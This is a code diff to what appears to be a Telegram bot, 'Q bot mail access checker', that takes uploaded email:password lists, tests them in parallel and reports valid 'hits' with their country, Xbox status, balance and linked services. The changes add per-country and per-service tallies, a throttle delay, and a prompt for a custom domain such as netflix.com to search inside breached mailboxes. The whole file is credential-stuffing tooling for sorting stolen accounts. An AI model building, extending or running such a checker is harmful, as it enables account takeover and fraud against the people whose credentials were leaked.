@@ -35,6 +35,10 @@ def send_message(chat_id, text, reply_markup=None):
         data["reply_markup"] = json.dumps(reply_markup)
     return api("sendMessage", data)
 
+def edit_message(chat_id, message_id, text):
+    data = {"chat_id": chat_id, "message_id": message_id, "text": text}
+    return api("editMessageText", data)
+
 def send_document(chat_id, path, caption=None):
     with open(path, "rb") as f:
         files = {"document": f}
@@ -582,19 +586,10 @@ def format_result(res):
     xdet = xbox.get("details") or xbox.get("status") or ""
     xbox_text = f"Xbox: {xdet if xdet else 'not FOUND'}"
     balance_text = build_balance_text(res.get("ms_data", {}))
-    hyp_parts = []
-    if res.get("hypixel_status") == "FOUND":
-        if res.get("hypixel_level"):
-            hyp_parts.append(f"Lvl:{res['hypixel_level']}")
-        if res.get("hypixel_bw_stars"):
-            hyp_parts.append(f"BW★{res['hypixel_bw_stars']}")
-        if res.get("hypixel_sb_coins"):
-            hyp_parts.append(f"SB:{res['hypixel_sb_coins']}")
-    hyp_text = " | ".join(hyp_parts) if hyp_parts else ""
     services = res.get("services", {}) or {}
     svc_list = [k for k, v in services.items() if v]
     svc_text = ", ".join(svc_list[:10]) + ("..." if len(svc_list) > 10 else "")
-    return f"{email}:{password} | {country} | {xbox_text} | {balance_text} | {hyp_text} | {svc_text}"
+    return f"{email}:{password} | {country} | {xbox_text} | {balance_text} | {svc_text}"
 
 def _take(lst, n):
     out = []
@@ -677,6 +672,13 @@ class ScanSession:
         self.batch = []
         self.hits_batch_lock = threading.Lock()
         self.last_status_time = 0.0
+        self.awaiting_domain = False
+        self.custom_domain = None
+        self.pending_accounts = None
+        self.status_msg_id = None
+        self.xbox_premium = 0
+        self.country_counts = {}
+        self.service_counts = {}
 
     def stop(self):
         self.stop_ev.set()
@@ -692,8 +694,26 @@ class BotApp:
         if not force and now - sess.last_status_time < 5:
             return
         with self.lock:
-            msg = f"Progress: {sess.checked}/{sess.total} | Hits: {sess.hits} | Bads: {sess.bads}"
-        send_message(chat_id, msg)
+            countries = ", ".join([f"{k}:{v}" for k, v in sorted(sess.country_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
+            services = ", ".join([f"{k}:{v}" for k, v in sorted(sess.service_counts.items(), key=lambda x: (-x[1], x[0]))[:10]]) or "-"
+            msg = (
+                "Q bot mail access checker\n"
+                f"hits : {sess.hits}\n"
+                f"bad : {sess.bads}\n"
+                f"xbox : {sess.xbox_premium}\n"
+                f"country : {countries}\n"
+                f"services : {services}\n"
+                "By : anon\n"
+                "channel : @anon_main1"
+            )
+        if sess.status_msg_id:
+            edit_message(chat_id, sess.status_msg_id, msg)
+        else:
+            try:
+                r = send_message(chat_id, msg)
+                sess.status_msg_id = r.get("result", {}).get("message_id")
+            except Exception:
+                pass
         sess.last_status_time = now
 
     def _flush_batch(self, sess: ScanSession, chat_id):
@@ -721,12 +741,18 @@ class BotApp:
         sess.total = len(accounts)
         kb = {"inline_keyboard": [[{"text": "Stop", "callback_data": f"STOP_{chat_id}"}]]}
         send_message(chat_id, f"Started scan: {sess.total} accounts\nIP: {get_ip()}", reply_markup=kb)
+        self._send_status(sess, chat_id, force=True)
         def worker(acc):
             if sess.stop_ev.is_set():
                 return
             em, pw = acc
             try:
                 checker = UnifiedChecker(debug=False, custom_services=None)
+                if sess.custom_domain:
+                    try:
+                        checker.services_map[sess.custom_domain.strip()] = "Custom"
+                    except Exception:
+                        pass
                 r = checker.check(em, pw)
             except:
                 r = {"status": "BAD"}
@@ -737,6 +763,16 @@ class BotApp:
                 with self.lock:
                     sess.results.append(line)
                     sess.hits += 1
+                    # update aggregates
+                    xb = (r.get("xbox") or {}).get("status", "").upper()
+                    if xb and xb != "FREE":
+                        sess.xbox_premium += 1
+                    c = (r.get("country") or "??").strip().upper()
+                    sess.country_counts[c] = sess.country_counts.get(c, 0) + 1
+                    sv = r.get("services", {}) or {}
+                    for k, v in sv.items():
+                        if v:
+                            sess.service_counts[k] = sess.service_counts.get(k, 0) + 1
                 # Batch-send every 100 hits
                 with sess.hits_batch_lock:
                     sess.batch.append(line)
@@ -752,7 +788,8 @@ class BotApp:
                 # periodic status
                 if sess.checked % 20 == 0:
                     self._send_status(sess, chat_id)
-        ex = ThreadPoolExecutor(max_workers=20)
+            time.sleep(0.12)
+        ex = ThreadPoolExecutor(max_workers=15)
         fs = [ex.submit(worker, acc) for acc in accounts]
         for f in fs:
             if sess.stop_ev.is_set():
@@ -797,8 +834,14 @@ class BotApp:
         if not accounts:
             send_message(chat_id, "No valid accounts found")
             return
-        t = threading.Thread(target=self.start_scan, args=(chat_id, accounts), daemon=True)
-        t.start()
+        # Ask for optional domain
+        sess = ScanSession(chat_id)
+        with self.lock:
+            self.sessions[chat_id] = sess
+        sess.awaiting_domain = True
+        sess.pending_accounts = accounts
+        kb = {"inline_keyboard": [[{"text": "Skip", "callback_data": f"SKIP_{chat_id}"}]]}
+        send_message(chat_id, "أرسل دومين إضافي للبحث (مثل: netflix.com) أو اضغط Skip", reply_markup=kb)
 
     def handle_stop(self, chat_id):
         with self.lock:
@@ -827,14 +870,37 @@ class BotApp:
                         if "document" in m:
                             fid = m["document"]["file_id"]
                             self.handle_file(chat_id, fid)
-                        elif "text" in m and m["text"].strip().lower() == "stop":
-                            self.handle_stop(chat_id)
+                        elif "text" in m:
+                            txt = m["text"].strip()
+                            if txt.lower() == "stop":
+                                self.handle_stop(chat_id)
+                                continue
+                            # handle domain input
+                            with self.lock:
+                                sess = self.sessions.get(chat_id)
+                            if sess and getattr(sess, "awaiting_domain", False) and sess.pending_accounts:
+                                if txt.lower() != "skip":
+                                    sess.custom_domain = txt
+                                sess.awaiting_domain = False
+                                accs = sess.pending_accounts
+                                sess.pending_accounts = None
+                                t = threading.Thread(target=self.start_scan, args=(chat_id, accs), daemon=True)
+                                t.start()
                     elif "callback_query" in upd:
                         cq = upd["callback_query"]
                         data = cq.get("data", "")
                         chat_id = cq["message"]["chat"]["id"]
                         if data.startswith("STOP_"):
                             self.handle_stop(chat_id)
+                        if data.startswith("SKIP_"):
+                            with self.lock:
+                                sess = self.sessions.get(chat_id)
+                            if sess and getattr(sess, "awaiting_domain", False) and sess.pending_accounts:
+                                sess.awaiting_domain = False
+                                accs = sess.pending_accounts
+                                sess.pending_accounts = None
+                                t = threading.Thread(target=self.start_scan, args=(chat_id, accs), daemon=True)
+                                t.start()
             except KeyboardInterrupt:
                 break
             except Exception:
